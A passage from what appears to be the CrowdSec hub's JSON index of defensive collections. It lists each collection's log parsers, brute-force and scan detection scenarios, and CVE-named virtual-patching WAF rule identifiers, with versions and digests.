"0.2": {"digest": "fa7cf1b7df176ab36a30f56f863949f204ffea11ba93ab2d31e63c88a716725c"}}}, "LePresidente/overseerr": {"content": "parsers:\n  - LePresidente/overseerr-logs\nscenarios:\n  - LePresidente/overseerr-bf\ndescription: \"overseerr Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - overseerr", "description": "overseerr Support : parser and brute-force detection", "parsers": ["LePresidente/overseerr-logs"], "path": "collections/LePresidente/overseerr.yml", "scenarios": ["LePresidente/overseerr-bf"], "version": "0.1", "versions": {"0.1": {"digest": "25fd12bd42233e51847faf10f6189ebbdc692ddf8ec9fe092ce4d3e55ef87ed3"}}}, "LePresidente/redmine": {"content": "parsers:\n  - LePresidente/redmine-logs\nscenarios:\n  - LePresidente/redmine-bf\ndescription: \"Redmine Support : parser and brute-force detection\"\nauthor: LePresidente\ntags:\n  - linux\n  - brute-force\n  - redmine", "description": "Redmine Support : parser and brute-force detection", "parsers": ["LePresidente/redmine-logs"], "path": "collections/LePresidente/redmine.yml", "scenarios": ["LePresidente/redmine-bf"], "version": "0.1", "versions": {"0.1": {"digest": "5e00897f8019dfd8e49d5040827577195a83d57a1903e654c395874d98b029cb"}}}, "LearningSpot/baserow": {"content": "parsers:\n  - LearningSpot/baserow-logs\nscenarios:\n  - LearningSpot/baserow-bf\ndescription: \"Baserow parser and brute-force detection\"\nauthor: LearningSpot\ntags:\n  - linux\n  - brute-force\n  - baserow\n", "description": "Baserow parser and brute-force detection", "parsers": ["LearningSpot/baserow-logs"], "path": "collections/LearningSpot/baserow.yml", "scenarios": ["LearningSpot/baserow-bf"], "version": "0.1", "versions": {"0.1": {"digest": "4572d46a4de2a365d2eed27abde750f507fee4330d8686a97ae8a5c327d38239"}}}, "LearningSpot/dockge": {"content": "parsers:\n  - LearningSpot/dockge-logs\nscenarios:\n  - LearningSpot/dockge-bf\ndescription: \"Dockge parser and brute-force detection\"\nauthor: LearningSpot\ntags:\n  - linux\n  - brute-force\n  - dockge\n", "description": "Dockge parser and brute-force detection", "parsers": ["LearningSpot/dockge-logs"], "path": "collections/LearningSpot/dockge.yml", "scenarios": ["LearningSpot/dockge-bf"], "version": "0.2", "versions": {"0.1": {"digest": "caa4e22e5ae61ba9dea955aaad2f251411dd0e58b92181b0f2377304e3be3ecb"}, "0.2": {"digest": "852e830fda04ad181b490f1cb26a88ae53d0d1c2439b50fc993feac9e3b24046"}}}, "LearningSpot/hestiacp": {"content": "parsers:\n  - LearningSpot/hestiacp-logs\nscenarios:\n  - LearningSpot/hestiacp-bf\ndescription: \"Hestiacp parser and brute-force detection\"\nauthor: LearningSpot\ntags:\n  - linux\n  - brute-force\n  - hestiacp\n", "description": "Hestiacp parser and brute-force detection", "parsers": ["LearningSpot/hestiacp-logs"], "path": "collections/LearningSpot/hestiacp.yml", "scenarios": ["LearningSpot/hestiacp-bf"], "version": "0.1", "versions": {"0.1": {"digest": "2abe888083413468b4dfeba29a195006d40f705cbce476d5fcc8c8983854ee4f"}}}, "LearningSpot/litellm": {"content": "parsers:\n  - LearningSpot/litellm-logs\nscenarios:\n  - LearningSpot/litellm-bf\ndescription: \"Litellm parser and brute-force detection\"\nauthor: LearningSpot\ntags:\n  - linux\n  - brute-force\n  - litellm\n", "description": "Litellm parser and brute-force detection", "parsers": ["LearningSpot/litellm-logs"], "path": "collections/LearningSpot/litellm.yml", "scenarios": ["LearningSpot/litellm-bf"], "version": "0.1", "versions": {"0.1": {"digest": "7a1d855798e0785532c1023ccb54ee563923c526b44c4b7d4d1a6cba9b1c312e"}}}, "MariuszKociubinski/bitwarden": {"content": "parsers: \n  - MariuszKociubinski/bitwarden-logs\nscenarios:\n  - MariuszKociubinski/bitwarden-bf\ndescription: \"Bitwarden Self Hosted support : parser and brute-force detection\"\nauthor: MariuszKociubinski\ntags:\n  - linux\n  - brute-force\n  - bitwarden", "description": "Bitwarden Self Hosted support : parser and brute-force detection", "parsers": ["MariuszKociubinski/bitwarden-logs"], "path": "collections/MariuszKociubinski/bitwarden.yaml", "scenarios": ["MariuszKociubinski/bitwarden-bf"], "version": "0.1", "versions": {"0.1": {"digest": "6b194780d0bcc423fb609ec55cf283df24510ea53e28ee63173fd8c94490de7c"}}}, "MrShippeR/filebrowser": {"content": "name: MrShippeR/filebrowser\ndescription: \"FileBrowser support : parser and scenario for bruteforce detection\"\nauthor: MrShippeR\ntags:\n  - linux\n  - bruteforce\n  - filebrowser\n  - auth\nparsers:\n  - MrShippeR/filebrowser-logs\nscenarios:\n  - MrShippeR/filebrowser-bf\n", "description": "FileBrowser support : parser and scenario for bruteforce detection", "parsers": ["MrShippeR/filebrowser-logs"], "path": "collections/MrShippeR/filebrowser.yaml", "scenarios": ["MrShippeR/filebrowser-bf"], "version": "0.1", "versions": {"0.1": {"digest": "55f835b7e0b05f5aaaa47c6bd92c52a3dcd73d4bfb2fda152b16cfb7fc19b01e"}}}, "PintjesB/technitium": {"content": "parsers:\n  - PintjesB/technitium-logs\nscenarios:\n  - PintjesB/technitium-bf\ndescription: \"Technitium DNS Server Support : parser and brute-force detection\"\nauthor: PintjesB\ntags:\n  - dns\n  - brute-force\n  - technitium\n", "description": "Technitium DNS Server Support : parser and brute-force detection", "parsers": ["PintjesB/technitium-logs"], "path": "collections/PintjesB/technitium.yml", "scenarios": ["PintjesB/technitium-bf"], "version": "0.1", "versions": {"0.1": {"digest": "b58e28a8ced4c35022fa56379e4e004f111fce638d79afab42df07a5c0fdb3c2"}}}, "Raithmir/zoraxy": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n  - Raithmir/zoraxy-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"Zoraxy support : parser and generic http scenarios\"\nauthor: Raithmir\ntags:\n  - linux\n  - zoraxy\n  - crawl\n  - scan\n", "description": "Zoraxy support : parser and generic http scenarios", "parsers": ["Raithmir/zoraxy-logs"], "path": "collections/Raithmir/zoraxy.yaml", "version": "0.1", "versions": {"0.1": {"digest": "254c0156cd8fdf185f3c6b1cb30f3c974680963abf0ed20bf77e9044da2c8662"}}}, "ZoeyVid/npmplus": {"collections": ["crowdsecurity/appsec-virtual-patching", "crowdsecurity/appsec-generic-rules", "crowdsecurity/appsec-wordpress", "crowdsecurity/base-http-scenarios", "crowdsecurity/http-cve", "crowdsecurity/wordpress", "crowdsecurity/modsecurity", "openappsec/openappsec"], "content": "parsers:\n  - ZoeyVid/npmplus-logs\n  - crowdsecurity/cri-logs\n  - crowdsecurity/dateparse-enrich\ncollections:\n  - crowdsecurity/appsec-virtual-patching\n  - crowdsecurity/appsec-generic-rules\n  - crowdsecurity/appsec-wordpress\n  - crowdsecurity/base-http-scenarios\n  - crowdsecurity/http-cve\n  - crowdsecurity/wordpress\n  - crowdsecurity/modsecurity\n  - openappsec/openappsec\nscenarios:\n  - crowdsecurity/nginx-req-limit-exceeded\ndescription: \"NPMplus support: parser and generic http scenarios\"\nauthor: ZoeyVid\ntags:\n  - linux\n  - nginx\n  - nginx-proxy\n  - crawl\n  - scan\n", "description": "NPMplus support: parser and generic http scenarios", "parsers": ["ZoeyVid/npmplus-logs", "crowdsecurity/cri-logs", "crowdsecurity/dateparse-enrich"], "path": "collections/ZoeyVid/npmplus.yaml", "scenarios": ["crowdsecurity/nginx-req-limit-exceeded"], "version": "0.5", "versions": {"0.1": {"digest": "fee2cab2c1ddb4243b18cbffffd1176bbc25bfbc3803140806738f23e1b301c4"}, "0.2": {"digest": "7b9d1c50999fe6dcf3df75344de98d68d394873c7a11c61de07aaaadc8ab6926"}, "0.3": {"digest": "70a7cd34504b8f6f00ba68b45999ba89b834e6e94b99d2619a3e9998f5ba2824"}, "0.4": {"digest": "e0e84240a835f76927a88a81650cb82386844eb70f92d174ea29d52bbae920e4"}, "0.5": {"digest": "6f6044f1be04c9dac32896016667ed0c8edbb2b98bb53e27a8147709b0d2295e"}}}, "a1ad/meshcentral": {"content": "parsers:\n  - a1ad/meshcentral-logs\nscenarios:\n  - a1ad/meshcentral-bf\ndescription: \"Meshcentral support : parser and brute-force detection\"\nauthor: a1ad\ntags:\n  - linux\n  - brute-force\n  - meshcentral\n", "description": "Meshcentral support : parser and brute-force detection", "parsers": ["a1ad/meshcentral-logs"], "path": "collections/a1ad/meshcentral.yml", "scenarios": ["a1ad/meshcentral-bf"], "version": "0.2", "versions": {"0.1": {"digest": "f3f12866b7128fab9b648ae1c27202c5d46aae241d2b0151a62956d17fc3774f"}, "0.2": {"digest": "dc8041951ca55d91c59af573ae9b6284a89f84cddc1267ffe0de56d0ebd41602"}}}, "a1ad/mikrotik": {"content": "parsers:\n  - a1ad/mikrotik-logs\nscenarios:\n  - a1ad/mikrotik-scan-multi_ports\n  - a1ad/mikrotik-bf\ndescription: \"Mikrotik support: logs, auth and port-scans detection scenarios\"\nauthor: a1ad\ntags:\n  - mikrotik\n  - portscan\n  - brute force\n", "description": "Mikrotik support: logs, auth and port-scans detection scenarios", "parsers": ["a1ad/mikrotik-logs"], "path": "collections/a1ad/mikrotik.yml", "scenarios": ["a1ad/mikrotik-scan-multi_ports", "a1ad/mikrotik-bf"], "version": "0.2", "versions": {"0.1": {"digest": "04e0cdfcab4158d6067397b7592b6fecc89171e0eeac055557b17d26e3d8c00b"}, "0.2": {"digest": "7def1e4c4f498ef43a22ef297c716013892f5b2cb201359e2d9336cc7d85f028"}}}, "aidalinfo/couchdb": {"content": "#the list of parsers it contains\nparsers:\n  - aidalinfo/couchdb-logs\nscenarios:\n  - aidalinfo/couchdb-bf\n  - aidalinfo/couchdb-crawl\n\ndescription: \"CouchDB parsers and scenarios for improve your security ! Made with <3 by Aidalinfo\"\nauthor: aidalinfo\ntags:\n  - couchdb\n", "description": "CouchDB parsers and scenarios for improve your security ! Made with <3 by Aidalinfo", "parsers": ["aidalinfo/couchdb-logs"], "path": "collections/aidalinfo/couchdb.yaml", "scenarios": ["aidalinfo/couchdb-bf", "aidalinfo/couchdb-crawl"], "version": "0.1", "versions": {"0.1": {"digest": "6fb50c70d3f6297ef796f52a6c0c733da6876c0fdea01d25bf87a910152c2f0a"}}}, "andreasbrett/baikal": {"content": "parsers:\n    - andreasbrett/baikal-logs\nscenarios:\n    - andreasbrett/baikal-bf\ndescription: \"Baikal support: parser and brute-force detection\"\nauthor: andreasbrett\ntags:\n    - linux\n    - brute-force\n    - baikal\n", "description": "Baikal support: parser and brute-force detection", "parsers": ["andreasbrett/baikal-logs"], "path": "collections/andreasbrett/baikal.yml", "scenarios": ["andreasbrett/baikal-bf"], "version": "0.1", "versions": {"0.1": {"digest": "cff4a56fbb40a4b6d7b8940d397728088090b3dfebb4e773abc0c895b5a724f0"}}}, "andreasbrett/paperless-ngx": {"content": "parsers:\n    - andreasbrett/paperless-ngx-logs\nscenarios:\n    - andreasbrett/paperless-ngx-bf\ndescription: \"Paperless-ngx support: parser and brute-force detection\"\nauthor: andreasbrett\ntags:\n    - linux\n    - brute-force\n    - paperless-ngx\n", "description": "Paperless-ngx support: parser and brute-force detection", "parsers": ["andreasbrett/paperless-ngx-logs"], "path": "collections/andreasbrett/paperless-ngx.yml", "scenarios": ["andreasbrett/paperless-ngx-bf"], "version": "0.1", "versions": {"0.1": {"digest": "ea3c8748bb3c1a0ba83d93cd3e93e18ce677407d3964e1e4b97d674507f33ef8"}}}, "andreasbrett/webmin": {"content": "parsers:\n    - andreasbrett/webmin-logs\nscenarios:\n    - andreasbrett/webmin-bf\ndescription: \"Webmin support: parser and brute-force detection\"\nauthor: andreasbrett\ntags:\n    - linux\n    - brute-force\n    - webmin\n", "description": "Webmin support: parser and brute-force detection", "parsers": ["andreasbrett/webmin-logs"], "path": "collections/andreasbrett/webmin.yml", "scenarios": ["andreasbrett/webmin-bf"], "version": "0.1", "versions": {"0.1": {"digest": "6224508886b13ff1c68c31faa7cc28ecd27ce7301b8f7089743c3f5d15bd73a2"}}}, "barnoux/caddy-coraza": {"content": "parsers:\n- barnoux/caddy-coraza\nscenarios:\n- barnoux/crs-anomaly-score\ndescription: \"Collection including parsers and scenarios for Caddy with Coraza WAF using OWASP Core Rule Set (CRS)\"\nauthor: barnoux\ntags:\n  - Web Application Firewall (WAF)\n  - OWASP Core Rule Set (CRS)\n  - Coraza\n", "description": "Collection including parsers and scenarios for Caddy with Coraza WAF using OWASP Core Rule Set (CRS)", "parsers": ["barnoux/caddy-coraza"], "path": "collections/barnoux/caddy-coraza.yaml", "scenarios": ["barnoux/crs-anomaly-score"], "version": "0.1", "versions": {"0.1": {"digest": "15c6522b0e5a40f325807d12a48446dacb07ee8f46dcf7e3569402f40274adcb"}}}, "baudneo/gotify": {"content": "parsers:\n  - crowdsecurity/syslog-logs\n  - baudneo/gotify-logs\nscenarios:\n  - baudneo/gotify-bf\ndescription: \"Gotify bruteforce login protection\"\nauthor: baudneo\ntags:\n  - Gotify\n  - bruteforce\n", "description": "Gotify bruteforce login protection", "parsers": ["crowdsecurity/syslog-logs", "baudneo/gotify-logs"], "path": "collections/baudneo/gotify.yaml", "scenarios": ["baudneo/gotify-bf"], "version": "0.1", "versions": {"0.1": {"digest": "9d3c0d0e2271d560f5aa45601cca9dd1d4f5722e7f1ca8198f21acc1231bca34"}}}, "baudneo/zoneminder": {"collections": ["baudneo/zoneminder_http-cve"], "content": "parsers:\n  - crowdsecurity/syslog-logs\n  - baudneo/zoneminder-logs\n  - crowdsecurity/dateparse-enrich\nscenarios:\n  - baudneo/zoneminder-bf\ncollections:\n  - baudneo/zoneminder_http-cve\ndescription: \"ZoneMinder bruteforce login, user enum and cve  protection\"\nauthor: baudneo\ntags:\n  - ZoneMinder\n  - bruteforce\n", "description": "ZoneMinder bruteforce login, user enum and cve  protection", "parsers": ["crowdsecurity/syslog-logs", "baudneo/zoneminder-logs", "crowdsecurity/dateparse-enrich"], "path": "collections/baudneo/zoneminder.yaml", "scenarios": ["baudneo/zoneminder-bf"], "version": "0.2", "versions": {"0.1": {"digest": "2ea1b2b8b5b7f1f6fe3c23300c08f0e6df8afea45ad94cb4cf6af36cdf489174"}, "0.2": {"digest": "a1f88aaab3a31ad0b469f80dc7ff1c12bbc3d0e8d3f1a2c4d7be218ab725e951"}}}, "baudneo/zoneminder_http-cve": {"content": "parsers:\n  - crowdsecurity/apache2-logs\n  - crowdsecurity/dateparse-enrich\nscenarios:\n  - baudneo/zoneminder_cve-2022-39285\n  - baudneo/zoneminder_cve-2022-39290\n  - baudneo/zoneminder_cve-2022-39291\ndescription: \"ZoneMinder CVE protection\"\nauthor: baudneo\ntags:\n  - ZoneMinder\n  - CVE-2022-39290\n", "description": "ZoneMinder CVE protection", "parsers": ["crowdsecurity/apache2-logs", "crowdsecurity/dateparse-enrich"], "path": "collections/baudneo/zoneminder_http-cve.yaml", "scenarios": ["baudneo/zoneminder_cve-2022-39285", "baudneo/zoneminder_cve-2022-39290", "baudneo/zoneminder_cve-2022-39291"], "version": "0.1", "versions": {"0.1": {"digest": "0c4bc2952784bd9cc0f2a9590fa6f60124fbeaf1f3c04f603ee8b53adeef8c4a"}}}, "bouddha-fr/opensearch-dashboard": {"content": "parsers:\n  - bouddha-fr/opensearch-dashboard-logs\nscenarios:\n  - bouddha-fr/opensearch-dashboard-bf\ndescription: \"OpenSearch support : parser and brute-force detection\"\nauthor: bouddha-fr\ntags:\n  - soc\n  - security\n  - opensearch\n  - wazuh\n  - bruteforce\n", "description": "OpenSearch support : parser and brute-force detection", "parsers": ["bouddha-fr/opensearch-dashboard-logs"], "path": "collections/bouddha-fr/opensearch-dashboard.yaml", "scenarios": ["bouddha-fr/opensearch-dashboard-bf"], "version": "0.1", "versions": {"0.1": {"digest": "685a44f6811ca5909fb95335b9aaf42144d7797c2bbd40ad9afecce74ef06ba8"}}}, "corvese/apache-guacamole": {"content": "parsers:\n  - crowdsecurity/syslog-logs\n  - corvese/apache-guacamole-logs\nscenarios:\n  - corvese/apache-guacamole_bf\n  - corvese/apache-guacamole_user_enum\ndescription: \"Apache Guacamole bruteforce login protection\"\nauthor: corvese\ntags:\n  - ApacheGuacamole\n  - bruteforce", "description": "Apache Guacamole bruteforce login protection", "parsers": ["crowdsecurity/syslog-logs", "corvese/apache-guacamole-logs"], "path": "collections/corvese/apache-guacamole.yaml", "scenarios": ["corvese/apache-guacamole_bf", "corvese/apache-guacamole_user_enum"], "version": "0.1", "versions": {"0.1": {"digest": "eec539fc4d01c275a0777aa0e41578fc1480f79e8b23c97e695c9ff1a855dd5c"}}}, "crowdsecurity/amavis": {"content": "parsers:\n  - crowdsecurity/amavis-logs\n  - crowdsecurity/syslog-logs\nscenarios:\n  - crowdsecurity/amavis-blocked\ndescription: \"amavis support : parser and blocking scenario\"\nauthor: crowdsecurity\ntags:\n  - clamav\n  - amavis\n  - mail\n", "description": "amavis support : parser and blocking scenario", "parsers": ["crowdsecurity/amavis-logs", "crowdsecurity/syslog-logs"], "path": "collections/crowdsecurity/amavis.yaml", "scenarios": ["crowdsecurity/amavis-blocked"], "version": "0.1", "versions": {"0.1": {"digest": "cbb1f1e1029d6b8d08023f5332f430942079a00fde8fa65b14ca18c1c8194ff6"}}}, "crowdsecurity/apache2": {"collections": ["crowdsecurity/base-http-scenarios"], "content": "parsers:\n#generic post-parsing of http stuff\n  - crowdsecurity/apache2-logs\ncollections:\n  - crowdsecurity/base-http-scenarios\ndescription: \"apache2 support : parser and generic http scenarios \"\nauthor: crowdsecurity\ntags:\n  - linux\n  - apache2\n  - crawl\n  - scan\n\n", "description": "apache2 support : parser and generic http scenarios ", "parsers": ["crowdsecurity/apache2-logs"], "path": "collections/crowdsecurity/apache2.yaml", "version": "0.1", "versions": {"0.1": {"digest": "3601f38e187479724e830e0182f51468c980f661e6eedc6d2e586f622e3b48ea"}}}, "crowdsecurity/apiscp": {"collections": ["crowdsecurity/apache2", "crowdsecurity/dovecot", "crowdsecurity/haproxy", "crowdsecurity/mysql", "crowdsecurity/postfix", "crowdsecurity/pgsql", "crowdsecurity/vsftpd"], "content": "scenarios:\n  - crowdsecurity/http-apiscp-bf\ncollections:\n  - crowdsecurity/apache2\n  - crowdsecurity/dovecot\n  - crowdsecurity/haproxy\n  - crowdsecurity/mysql\n  - crowdsecurity/postfix\n  - crowdsecurity/pgsql\n  - crowdsecurity/vsftpd\ndescription: \"apisCP support : collections for services supported by apisCP + apisCP admin page parser/scenario bruteforce\"\nauthor: crowdsecurity\ntags:\n  - apiscp\n\n", "description": "apisCP support : collections for services supported by apisCP + apisCP admin page parser/scenario bruteforce", "path": "collections/crowdsecurity/apiscp.yaml", "scenarios": ["crowdsecurity/http-apiscp-bf"], "version": "0.1", "versions": {"0.1": {"digest": "0d5b10b1ab997a9826b657dfa145799904c7f340c38b0db0855f24900900408a"}}}, "crowdsecurity/appsec-crs": {"appsec-configs": ["crowdsecurity/crs"], "appsec-rules": ["crowdsecurity/crs"], "content": "parsers:\n  - crowdsecurity/appsec-logs\nappsec-configs:\n  - crowdsecurity/crs\nappsec-rules:\n  - crowdsecurity/crs\nscenarios:\n  - crowdsecurity/crowdsec-appsec-outofband\ndescription: \"WAF: Non-Blocking OWASP Core Rule Set\"\ncontexts:\n  - crowdsecurity/appsec_base\nauthor: crowdsecurity\ntags:\n  - linux\n  - http\n  - appsec\n  - modsecurity\n", "contexts": ["crowdsecurity/appsec_base"], "description": "WAF: Non-Blocking OWASP Core Rule Set", "parsers": ["crowdsecurity/appsec-logs"], "path": "collections/crowdsecurity/appsec-crs.yaml", "scenarios": ["crowdsecurity/crowdsec-appsec-outofband"], "version": "0.7", "versions": {"0.1": {"digest": "61d5e358aa86b872300e540be39b066c278567c4948bb74d4e4f339bbb126154"}, "0.2": {"digest": "a9f36fac18d19edcb0c3a2a4ff3d58570fc407ac39fb9447e9dac7510184fd47"}, "0.3": {"digest": "7f56cb3fa217f983d1648e6aea36d399be444e09046c0b5b23e7eb55480eaf89"}, "0.4": {"digest": "a9f36fac18d19edcb0c3a2a4ff3d58570fc407ac39fb9447e9dac7510184fd47"}, "0.5": {"digest": "be79c745b92be435cdb23856701ab5894b769e4a560184c8c22ab1eaeb64cbe8"}, "0.6": {"digest": "6ad8a174d727ac0d16fd8b65a3cdd963c9d6f645a43911523e1930d70cf71c49"}, "0.7": {"digest": "fe419d9318319bef6e295b358ad19627247b713914739b0ff916ae1f328b7a1e"}}}, "crowdsecurity/appsec-crs-inband": {"appsec-configs": ["crowdsecurity/crs-inband"], "appsec-rules": ["crowdsecurity/crs"], "content": "parsers:\n  - crowdsecurity/appsec-logs\nappsec-configs:\n  - crowdsecurity/crs-inband\nappsec-rules:\n  - crowdsecurity/crs\nscenarios:\n  - crowdsecurity/appsec-native\ndescription: \"WAF: Blocking OWASP Core Rule Set\"\ncontexts:\n  - crowdsecurity/appsec_base\nauthor: crowdsecurity\ntags:\n  - linux\n  - http\n  - appsec\n  - modsecurity\n", "contexts": ["crowdsecurity/appsec_base"], "description": "WAF: Blocking OWASP Core Rule Set", "parsers": ["crowdsecurity/appsec-logs"], "path": "collections/crowdsecurity/appsec-crs-inband.yaml", "scenarios": ["crowdsecurity/appsec-native"], "version": "0.2", "versions": {"0.1": {"digest": "ba52868e80ef035d84db76252c6ca50dcb49ca9a6737d0ac76ca49700433a601"}, "0.2": {"digest": "f1a56a5adefedd37deea4617b7a95e91e2b6da44d133f941038c410c3b53d4b1"}}}, "crowdsecurity/appsec-generic-rules": {"appsec-configs": ["crowdsecurity/generic-rules", "crowdsecurity/appsec-default"], "appsec-rules": ["crowdsecurity/base-config", "crowdsecurity/generic-freemarker-ssti", "crowdsecurity/generic-wordpress-uploads-php", "crowdsecurity/generic-wordpress-uploads-listing", "crowdsecurity/appsec-generic-test", "crowdsecurity/experimental-no-user-agent"], "content": "name: crowdsecurity/appsec-generic-rules\nappsec-rules:\n  - crowdsecurity/base-config\n  - crowdsecurity/generic-freemarker-ssti\n  - crowdsecurity/generic-wordpress-uploads-php\n  - crowdsecurity/generic-wordpress-uploads-listing\n  - crowdsecurity/appsec-generic-test\n  - crowdsecurity/experimental-no-user-agent\nappsec-configs:\n  - crowdsecurity/generic-rules\n  - crowdsecurity/appsec-default\nparsers:\n  - crowdsecurity/appsec-logs\nscenarios:\n  - crowdsecurity/appsec-vpatch\n  - crowdsecurity/appsec-native\n  - crowdsecurity/appsec-generic-test\ncontexts:\n  - crowdsecurity/appsec_base\ndescription: \"A collection of generic attack vectors for additional protection.\"\nauthor: crowdsecurity\n", "contexts": ["crowdsecurity/appsec_base"], "description": "A collection of generic attack vectors for additional protection.", "parsers": ["crowdsecurity/appsec-logs"], "path": "collections/crowdsecurity/appsec-generic-rules.yaml", "scenarios": ["crowdsecurity/appsec-vpatch", "crowdsecurity/appsec-native", "crowdsecurity/appsec-generic-test"], "version": "1.0", "versions": {"0.1": {"digest": "f538ca65415d016977a2ed77939df0cecdea212bb16c3e1c22f1df0b1ec2775b"}, "0.2": {"digest": "16e54590169a4094bd679c607d8714fe97984e86529448cf61975fe6c270be05"}, "0.3": {"digest": "54c64c526b187a93140bbb8abf9b25b3c3f8028117fcd9859749d86808f2f2af"}, "0.4": {"digest": "e985557ce1bcf99fcf4c7360bdc1085628a894880b1e0860bedd6426eb2e05b1"}, "0.5": {"digest": "712078647aa7414a2447248cbf68a75919be37767452b14cb7e0b845e51d9972"}, "0.6": {"digest": "7428b01d3f12284c6a5e4db84c641ee0bfa37672911e364fabe8ffea816fcd83"}, "0.7": {"digest": "306003d46e7de939013ad7219e27bb4da8a81f6d9d16ecff28d99b5916ead930"}, "0.8": {"digest": "2e06865ffdd4b3f526a4ee58501dfe5ac0f0e94b8df44c3d61cdb78e24f24fcf"}, "0.9": {"digest": "3ed4aa0642fdfdda3163790475b7c9ab4d4b70ba342ceb4c25773e289f985394"}, "1.0": {"digest": "3003e8df3259641f6d7d521c56e063b462bb6fd0003385c7cd17ee02903d4944"}}}, "crowdsecurity/appsec-virtual-patching": {"appsec-configs": ["crowdsecurity/virtual-patching", "crowdsecurity/appsec-default"], "appsec-rules": ["crowdsecurity/base-config", "crowdsecurity/vpatch-env-access", "crowdsecurity/vpatch-CVE-2023-40044", "crowdsecurity/vpatch-CVE-2017-9841", "crowdsecurity/vpatch-CVE-2020-11738", "crowdsecurity/vpatch-CVE-2022-27926", "crowdsecurity/vpatch-CVE-2022-35914", "crowdsecurity/vpatch-CVE-2022-46169", "crowdsecurity/vpatch-CVE-2023-20198", "crowdsecurity/vpatch-CVE-2023-22515", "crowdsecurity/vpatch-CVE-2023-33617", "crowdsecurity/vpatch-CVE-2023-34362", "crowdsecurity/vpatch-CVE-2023-3519", "crowdsecurity/vpatch-CVE-2023-42793", "crowdsecurity/vpatch-CVE-2023-50164", "crowdsecurity/vpatch-CVE-2023-38205", "crowdsecurity/vpatch-CVE-2023-24489", "crowdsecurity/vpatch-CVE-2021-3129", "crowdsecurity/vpatch-CVE-2021-22941", "crowdsecurity/vpatch-CVE-2019-12989", "crowdsecurity/vpatch-CVE-2022-44877", "crowdsecurity/vpatch-CVE-2018-10562", "crowdsecurity/vpatch-CVE-2023-6553", "crowdsecurity/vpatch-CVE-2018-1000861", "crowdsecurity/vpatch-CVE-2019-1003030", "crowdsecurity/vpatch-CVE-2022-22965", "crowdsecurity/vpatch-CVE-2023-23752", "crowdsecurity/vpatch-CVE-2023-49070", "crowdsecurity/vpatch-laravel-debug-mode", "crowdsecurity/vpatch-CVE-2023-28121", "crowdsecurity/vpatch-CVE-2020-17496", "crowdsecurity/vpatch-CVE-2023-1389", "crowdsecurity/vpatch-CVE-2023-7028", "crowdsecurity/vpatch-CVE-2023-46805", "crowdsecurity/vpatch-CVE-2024-23897", "crowdsecurity/vpatch-CVE-2023-22527", "crowdsecurity/vpatch-CVE-2023-35078", "crowdsecurity/vpatch-CVE-2023-35082", "crowdsecurity/vpatch-CVE-2022-22954", "crowdsecurity/vpatch-CVE-2024-1212", "crowdsecurity/vpatch-symfony-profiler", "crowdsecurity/vpatch-connectwise-auth-bypass", "crowdsecurity/vpatch-CVE-2024-22024", "crowdsecurity/vpatch-CVE-2024-27198", "crowdsecurity/vpatch-CVE-2024-3273", "crowdsecurity/vpatch-CVE-2024-4577", "crowdsecurity/vpatch-CVE-2024-29849", "crowdsecurity/vpatch-CVE-2023-47218", "crowdsecurity/vpatch-git-config", "crowdsecurity/vpatch-CVE-2024-32113", "crowdsecurity/vpatch-CVE-2024-3272", "crowdsecurity/vpatch-CVE-2024-28255", "crowdsecurity/vpatch-CVE-2024-29824", "crowdsecurity/vpatch-CVE-2024-27348", "crowdsecurity/vpatch-CVE-2020-5902", "crowdsecurity/vpatch-CVE-2018-13379", "crowdsecurity/vpatch-CVE-2022-26134", "crowdsecurity/vpatch-CVE-2024-34102", "crowdsecurity/vpatch-CVE-2024-29973", "crowdsecurity/vpatch-CVE-2022-41082", "crowdsecurity/vpatch-CVE-2019-18935", "crowdsecurity/vpatch-CVE-2024-8190", "crowdsecurity/vpatch-CVE-2024-28987", "crowdsecurity/vpatch-CVE-2024-38856", "crowdsecurity/vpatch-CVE-2018-20062", "crowdsecurity/vpatch-CVE-2021-26086", "crowdsecurity/vpatch-CVE-2024-51567", "crowdsecurity/vpatch-CVE-2024-27956", "crowdsecurity/vpatch-CVE-2024-27954", "crowdsecurity/vpatch-CVE-2024-0012", "crowdsecurity/vpatch-CVE-2024-9474", "crowdsecurity/vpatch-CVE-2024-7593", "crowdsecurity/vpatch-CVE-2024-52301", "crowdsecurity/vpatch-CVE-2024-8963", "crowdsecurity/vpatch-CVE-2024-38816", "crowdsecurity/vpatch-CVE-2024-9465", "crowdsecurity/vpatch-CVE-2024-51378", "crowdsecurity/vpatch-CVE-2024-41713", "crowdsecurity/vpatch-CVE-2024-6205", "crowdsecurity/vpatch-CVE-2025-29927", "crowdsecurity/vpatch-CVE-2022-25488", "crowdsecurity/vpatch-CVE-2020-9054", "crowdsecurity/vpatch-CVE-2024-27564", "crowdsecurity/vpatch-CVE-2021-44529", "crowdsecurity/vpatch-CVE-2024-57727", "crowdsecurity/vpatch-CVE-2024-27292", "crowdsecurity/vpatch-CVE-2025-24893", "crowdsecurity/vpatch-CVE-2021-43798", "crowdsecurity/vpatch-CVE-2022-1388", "crowdsecurity/vpatch-CVE-2021-26294", "crowdsecurity/vpatch-CVE-2002-1131", "crowdsecurity/vpatch-CVE-2023-0297", "crowdsecurity/vpatch-CVE-2007-0885", "crowdsecurity/vpatch-CVE-2024-32870", "crowdsecurity/vpatch-CVE-2025-28367", "crowdsecurity/vpatch-CVE-2025-3248", "crowdsecurity/vpatch-CVE-2025-31161", "crowdsecurity/vpatch-CVE-2025-31324", "crowdsecurity/vpatch-CVE-2025-29306", "crowdsecurity/vpatch-CVE-2025-49113", "crowdsecurity/appsec-generic-test", "crowdsecurity/vpatch-CVE-2025-25257", "crowdsecurity/vpatch-CVE-2019-5418", "crowdsecurity/vpatch-CVE-2025-52488", "crowdsecurity/vpatch-CVE-2025-49132", "crowdsecurity/vpatch-CVE-2025-47812", "crowdsecurity/vpatch-CVE-2024-51977", "crowdsecurity/vpatch-CVE-2022-31499", "crowdsecurity/vpatch-CVE-2025-57819", "crowdsecurity/vpatch-CVE-2024-46506", "crowdsecurity/vpatch-CVE-2025-3605", "crowdsecurity/vpatch-CVE-2024-29028", "crowdsecurity/vpatch-CVE-2023-6000", "crowdsecurity/vpatch-CVE-2024-0204", "crowdsecurity/vpatch-CVE-2020-25078", "crowdsecurity/vpatch-CVE-2023-23063", "crowdsecurity/vpatch-CVE-2022-38627", "crowdsecurity/vpatch-CVE-2025-36604", "crowdsecurity/vpatch-CVE-2025-61882"], "content": "appsec-configs:\n- crowdsecurity/virtual-patching\n- 